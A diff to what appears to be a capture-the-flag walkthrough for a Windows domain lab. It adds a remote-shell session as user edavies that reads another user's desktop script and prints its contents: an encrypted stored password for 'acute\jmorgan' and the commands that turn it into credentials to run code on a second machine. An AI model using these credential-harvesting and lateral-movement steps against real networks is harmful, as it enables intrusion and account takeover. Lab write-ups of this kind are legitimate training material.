@@ -469,7 +469,12 @@ evil-winrm-py PS C:\Users\edavies\Documents>
 There is an interesting file on the desktop
 
 ```python
-
+evil-winrm-py PS C:\Users\edavies\Documents> Invoke-Command -ComputerName ATSSERVER -ScriptBlock {cat C:\Users\imonks\Desktop\wm.ps1} -Credential $cred -ConfigurationName dc_manage
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+evil-winrm-py PS C:\Users\edavies\Documents>
 ```
 
 
